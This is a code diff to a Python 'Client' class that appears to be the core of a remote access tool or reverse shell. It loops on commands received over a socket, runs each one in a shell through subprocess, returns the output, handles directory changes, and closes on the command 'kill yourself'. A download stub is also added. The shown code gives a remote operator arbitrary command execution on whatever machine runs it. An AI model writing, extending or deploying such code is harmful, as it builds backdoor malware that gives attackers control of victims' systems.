@@ -43,19 +43,26 @@ class Client():
                 try:
                     os.chdir(command[3:])
                 except OSError:
-                    return f"Location {command[3:]} does not exits!"
+                    return f"Directory {command[3:]} does not exits!"
+                
             else:
                 process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                 result = process.stdout.read() + process.stderr.read()
                 return result
+            
         except Exception as e:
            return e
 
+    def _download(self, file):
+        pass
+    
     def _handle_server(self):
         while True:
             command = self._receive()
-            
-            if command == "exit":
+
+            if not command:
+                continue
+            elif "kill yourself" == command:
                 self.sock.close()
             else:
                 result = self._exec_command(command)
